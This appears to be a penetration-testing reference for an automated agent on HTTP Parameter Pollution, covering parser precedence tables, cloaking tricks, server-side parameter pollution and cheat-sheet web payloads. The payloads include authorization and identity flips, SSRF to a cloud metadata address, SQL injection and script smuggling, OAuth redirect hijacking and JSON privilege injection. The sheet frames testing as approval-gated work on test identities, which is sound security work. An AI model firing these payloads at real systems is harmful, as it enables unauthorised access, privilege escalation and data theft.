# HTTP Parameter Pollution (HPP) techniques
# Benign: flip a decision on TEST identities. When HPP smuggles another payload, hand off to that agent.

## Parser precedence — who wins when a parameter repeats (fingerprint first)
| Stack | Duplicate `p=a&p=b` resolves to |
|---|---|
| ASP.NET / IIS | first (a) — actually comma-joins: `a,b` |
| PHP / Apache | last (b) |
| JSP / Tomcat / Servlet | first (a) |
| Python / Flask | first, but `getlist` sees both |
| Node Express (`querystring`) | first; (`qs`) arrays/last-wins |
| Spring MVC | binds both to a list |
| Perl CGI | comma-concatenated `a,b` |
| JSON duplicate keys | usually last-wins; some gateways reject |
A **discrepancy between the front layer (gateway/WAF/validator) and the backend** is the vulnerability:
the inspected value is benign, the acted-on value is malicious.

## Inject across every source
```
?p=v1&p=v2                              # URL query
(body)  p=v1&p=v2                        # form POST
?p=v1  + body p=v2                       # hybrid (URL vs body precedence)
{"p":"a","p":"b"}                        # JSON duplicate keys
Cookie: role=user; role=admin           # duplicate cookie
X-Forwarded-For: 1.2.3.4, 127.0.0.1     # duplicate/CSV header
p[]=a&p[]=b   p[0]=a&p[1]=b   p=x&p[]=y  # array notation + mixed
```

## Parameter cloaking (defeat a validator that keys on the literal name)
```
par%61m=   (param)      PARAM=   (case)      par%2561m=   (double-encode)
param%00=              Greek/Unicode lookalike for a letter
```

## Exploit patterns (benign proof on test identities)
```
access=false&access=true          admin=false&admin=true         # authorization flip
user=victim&user=admin            id=attacker&id=victim          # identity / IDOR
amount=1&amount=1000   price=0&price=... to=victim&to=attacker   # value override (approval for real change)
url=https://ok&url=http://169.254.169.254/   -> hand to ssrf-*   # SSRF smuggle
category=1&category=1 OR 1=1       -> hand to sqli-*             # filter/WAF bypass smuggle
q=safe&q=<script>...   -> hand to xss-*                          # WAF bypass smuggle
redirect_uri=ok&redirect_uri=attacker   -> hand to oauth         # OAuth redirect dup
Transfer-Encoding dup / Content-Length dup   -> hand to request-smuggling
```

## GraphQL / WebSocket angle
```
# GraphQL duplicate variable or alias flooding (rate-limit / auth bypass):
query ($id:Int!, $id:Int!) {...}        a: user(id:1) b: user(id:2) ... (alias flood)
# WebSocket upgrade URL dup: ?token=a&token=b&room=1&room=admin ; dup keys in JSON frames
```

## Confirm + tools
Compare which value the response reflects/acts on across layers; verify the authz/value change on test
identities. Param Miner (hidden params), Burp Repeater/Intruder. Pure override via duplication = an HPP
finding; a smuggled payload = the delivered bug (confirmed by that agent), HPP noted as the vector.

---
## Extended arsenal — expanded parser-precedence matrix (query vs body)

# Fingerprint BOTH layers. The exploit needs the front layer to read one occurrence and the backend to read
# a DIFFERENT one. "first"/"last"/"all"/"concat" below is the value a single string accessor returns.

| Stack / accessor | `p=a&p=b` (query) | body `p=a&p=b` | all-values accessor |
|---|---|---|---|
| PHP (`$_GET['p']`) | last (b) | last (b) | `$_GET['p']` is last only; `p[]` for array |
| ASP.NET (`Request['p']`) | comma-join `a,b` | comma-join | `Request.QueryString.GetValues` |
| ASP.NET Core (`Request.Query`) | StringValues `[a,b]`; `.ToString()` -> `a,b` | same | StringValues array |
| ASP classic (`Request.QueryString`) | comma-join `a,b` | comma-join | `(i)` index |
| Java Servlet (`getParameter`) | first (a) | first (a) | `getParameterValues` -> [a,b] |
| Spring MVC (`@RequestParam String`) | first (a) | first (a) | `@RequestParam List` -> [a,b] |
| JSP `request.getParameter` | first (a) | first (a) | getParameterValues |
| Node Express (`req.query`, qs) | array `[a,b]`; string use -> `a,b` / `[object]` | body-parser-dependent | arrays native |
| Node `querystring.parse` | array `[a,b]` | — | arrays native |
| Python Flask (`request.args['p']`) | first (a) | first (a) | `getlist('p')` -> [a,b] |
| Python Django (`request.GET['p']`) | last (b) | last (b) | `getlist('p')` -> [a,b] |
| Ruby Rack / Rails (`params[:p]`) | last (b) | last (b) | `p[]` -> array |
| Go net/http (`r.FormValue`) | first (a) | first (a) | `r.Form['p']` -> [a,b] |
| Perl CGI (`param('p')`) | first in scalar; list in list ctx | same | list context -> [a,b] |
| ColdFusion | comma-join `a,b` | comma-join | list functions |
| API Gateway / serverless | integration-dependent (last OR array) | same | mapping-template dependent |

# Arrays matter: a layer that returns `[a,b]` may stringify to `a,b`, `a`, or `[object Object]` depending on
# how the code uses it — test the ACTUAL endpoint, don't assume from the table.

---
## Extended arsenal — gateway ↔ backend discrepancy (the actual vulnerability)

# The bug exists when the layer that makes the SECURITY decision reads a different occurrence than the layer
# that ACTS. Pick the duplicate ORDER so the inspected value is benign and the acted value is yours.

| Front layer reads | Backend reads | Exploit ordering (`p=INSPECTED&p=ACTED`) |
|---|---|---|
| first (servlet-style WAF/validator) | last (PHP/Django/Rails app) | `p=benign&p=payload` (front sees benign, app uses payload) |
| last (PHP-ish edge) | first (servlet app) | `p=payload&p=benign` |
| one value (string) | all values (getlist / array) | app loops the array -> your extra value is processed |
| comma-join (ASP/CF) | split-on-comma consumer | smuggle via the comma: `p=benign,payload` or dup -> `a,b` |
| normalizes / drops dup | keeps both | pollution the edge never saw |
| inspects body only | reads query (or vice-versa) | split across URL vs body (hybrid HPP) |

# Also exploit DIFFERENT SOURCES: edge authz keys on a cookie, app on a same-named query param; WAF inspects
# the FIRST occurrence, backend concatenates all. Map which layer owns the decision, first.

---
## Extended arsenal — placement deep-dive (every injection point)

### Query vs body vs hybrid
```
?p=a&p=b                                  # query dup
(body) p=a&p=b                            # body dup
?p=a  +  (body) p=b                        # hybrid: which source wins (framework-dependent)
?p[]=a&p[]=b   ?p[0]=a&p[1]=b   ?p=a&p[]=b  # array notation + mixed scalar/array
```
### JSON body
```json
{"p":"a","p":"b"}                          // duplicate key (most parsers last-wins; some gateways reject)
{"p":"a","P":"b"}                          // case variant if the backend lowercases keys
{"p":["a","b"]}   {"p":{"0":"a"}}          // array / object where a scalar is expected
```
### Cookies
```
Cookie: role=user; role=admin              # duplicate cookie name (server picks first/last per stack)
Cookie: role=user, role=admin              # comma-joined
# cookie scoping: a more-specific Path/Domain cookie can shadow another; set via Set-Cookie on a subpath.
# precedence: does the app trust the cookie or a same-named query/body param? test the override direction.
```
### Headers
```
X-Forwarded-For: 1.2.3.4, 127.0.0.1        # CSV header: front reads one end, app the other
duplicate X-Forwarded-For twice            # which occurrence the app trusts for authz / rate-limit / logging
Host / X-Forwarded-Host dup                # -> host-header skill if it reaches a reset / redirect / cache key
header folding (obs-fold continuation)     # legacy value-splitting
```
### Path / matrix parameters
```
/app;p=a/path;p=b                          # matrix (path) params (servlet-style) the app may read as p
/app/..;/admin                             # path-param segment confusion (routing vs authz layer)
```
Pick the source the DECISION layer and the ACTION layer disagree on.

---
## Extended arsenal — security-decision flips (benign proofs on test identities)

# Confirm each with DISTINGUISHABLE BENIGN values so you can see which occurrence won — only escalate to a
# real value change with approval, on a test account.

| Decision flipped | Benign dup probe | Proof (benign) |
|---|---|---|
| authorization / role | `access=denied&access=granted` (alpha/bravo values) | response acts on #2 though edge saw #1 |
| identity / tenant (IDOR) | `id=TEST_A&id=TEST_B` (two test accounts) | you receive B's object while authed as A -> idor |
| price / quantity / amount | `qty=1&qty=1`, then (approved) `amount=1&amount=2` on a test cart | server totals the acted value |
| state / status | `status=pending&status=approved` on a TEST record | record flips though the validator saw `pending` |
| feature flag / plan | `plan=free&plan=pro` | a gated feature renders for the test account |
| filter / allow-list smuggle | `url=https://allowed&url=https://HOST/marker` | allow-list passes #1, fetch hits #2 -> ssrf-* |
| rate-limit key | `user=victim&user=me` / dup API-key param | limiter keys on one, action on the other |
| cache key | `cb=1&cb=2` or dup of a keyed param | edge caches under one value, origin varies on another -> cache-poisoning |
| WAF signature target | `q=benign&q=<smuggle>` | WAF inspects the occurrence it reads; app uses the other -> waf-bypass |
| OAuth redirect binding | `redirect_uri=ok&redirect_uri=HOST` | code/token delivery binds to the acted value -> oauth |

# Pure duplication that flips the decision = an HPP finding. A SMUGGLED payload (SQLi/XSS/SSRF/smuggling) =
# the delivered bug, confirmed by that agent; HPP is recorded as the delivery vector.

---
## Extended arsenal — confirming the parser discrepancy (benign method)

# Goal: PROVE the front layer and the backend read different occurrences — without any harmful value.
```
# Step 1 — baseline: send ONE param, note exactly which value the response reflects/acts on.
#   ?p=alpha            -> response shows "alpha"
# Step 2 — duplicate with two benign, distinguishable values; see which the BACKEND uses:
#   ?p=alpha&p=bravo    -> response shows "bravo"  => backend is last-wins
# Step 3 — probe the FRONT layer: put a value the edge/validator would flag in ONE occurrence (a benign
#   canary that trips a rule, e.g. a tame `OR 1=1` string) and a clean value in the other. If the request is
#   BLOCKED, the front inspected that occurrence; if it PASSES, the front read the other one.
# Step 4 — discrepancy confirmed when: the front inspects occurrence X (blocks when the canary is there) but
#   the backend reflects/acts on occurrence Y (step 2). That split is the vulnerability.
# Step 5 — benign impact demo: use test identities / a marker value in occurrence Y to flip the decision.
```
# Oracles for "which value won": response reflection, differential status/body, an echoed error, a logged
# value you can retrieve, or a benign state change on a TEST record. Re-test fresh to rule out caching.

---
## Extended arsenal — parameter cloaking & name-encoding (defeat name-keyed validators)

# A validator that keys on the LITERAL parameter name misses a value delivered under a differently-spelled
# name the backend normalizes to the same key.
```
param   vs   par%61m (param)   vs   par%2561m (double-enc)   vs   PARAM (case, if backend folds)
param%00   param%20 / trailing space   param%09 (tab)   param. / param[]  (trailing dot / brackets)
%70aram (encode first byte)   ｐaram (full-width lookalike)   рaram (Cyrillic homoglyph)
param%0d%0a (CRLF in name — lax parsers)     param;x (semicolon / matrix split)
```
# Confirm the backend maps the cloaked name to the real parameter (reflection / behavior change) while the
# validator treated it as an unknown/benign field. Keep values benign; this proves the name-based filter gap.

---
## Extended arsenal — tooling & quick-reference

### Tools (benign, confirm manually)
```
Param Miner (hidden / dup params)        Burp Repeater / Intruder (compare which occurrence wins)
Arjun / paramspider (param discovery)    custom script: fire each dup ordering, diff the responses
```
### Quick confirm table
| Observation | Interpretation |
|---|---|
| dup returns the 2nd value | backend last-wins (PHP / Django / Rails / ASP comma-then-split) |
| dup returns the 1st value | backend first-wins (servlet / Spring / Flask / Go / Express-as-string) |
| dup returns `a,b` | comma-join stack (ASP / ASP.NET / CF / Perl list) — smuggle via the comma |
| canary blocks only when in occurrence #1 | front inspects occurrence #1 |
| a blocked value still acts on the backend | discrepancy -> HPP exploitable |
| array `p[]` changes the result | backend consumes all values (getlist / array) |

# Pure override via duplication = the HPP finding. A smuggled payload = the delivered bug (that agent
# confirms it); HPP is noted as the vector. Stay benign, use test identities, get approval for real changes.

## Extended arsenal — server-side parameter pollution (SSPP)   (differential/error proof · real state changes approval-gated)

Distinct from the duplicate-occurrence precedence above: here YOUR input is concatenated into a
*server-side* request the front-end makes to an INTERNAL API (e.g. `GET /users/search?name=<you>&publicProfile=true`).
URL-encode a query/path/structure metacharacter to truncate, add, or override params on that INNER request.
Any field can reach the sink — query, body, headers, path segments.

### Query-string injection (URL-encode the metacharacter)
| intent | send (as the value) | inner request becomes | tell |
|---|---|---|---|
| truncate the rest | `name=peter%23` | `...?name=peter#&publicProfile=true` | drops `publicProfile=true` → private records returned = confirmed |
| add an ignored param | `name=peter%26foo=x` | `...?name=peter&foo=x&...` | response unchanged → injected but unused |
| add a MEANINGFUL param | `name=peter%26email=x` | `...?name=peter&email=x&...` | behaviour/error changes → the inner param is parsed |
| override an existing param | `name=peter%26name=carlos` | `...?name=peter&name=carlos&...` | result depends on the INNER stack (below) |

Inner duplicate-parameter precedence (infer the backend from which value wins):
```
PHP            -> LAST wins  (carlos)
ASP.NET        -> COMBINED   (peter,carlos)  -> often an "Invalid ..." error = a handy oracle
Node / Express -> FIRST wins (peter)         -> response unchanged
```
Find inner-param candidates with hidden-parameter discovery, then test `%26<param>=<value>`.

### REST path injection (input lands in a path segment)
```
name=peter%2f..%2fadmin     ->  /api/private/users/peter/../admin   --normalize-->   /api/private/users/admin
```

### Structured-data injection (input embedded into JSON/XML unencoded)
```
# direct JSON field injection
name = peter","access_level":"administrator      -> {"name":"peter","access_level":"administrator"}
# app decodes then re-embeds without re-encoding
{"name":"peter\",\"access_level\":\"administrator"}
# XML sink -> XInclude / XXE: hand to xxe-*
```

### Detect (victimless, benign)
```
1. inject ONE encoded metachar at a time: %23(#)  %26(&)  =  "  \      -> diff body/status/error vs baseline
2. read the error TEXT: "Invalid name" echoing your tail = NOT truncated; split/combined values fingerprint the stack
3. path values: try %2f..%2f and check whether the inner router normalizes
```
Benign ethos: confirm by DIFFERENTIAL or ERROR only. A truncation that merely widens a result set is
confirm-only; anything that flips an authz flag / identity / price uses TEST identities and is approval-gated
for a real state change. De-dupe: if the inner request carries the input into SQL/NoSQL/XXE, that is the
delivered bug — hand it to that agent; SSPP is the vector.
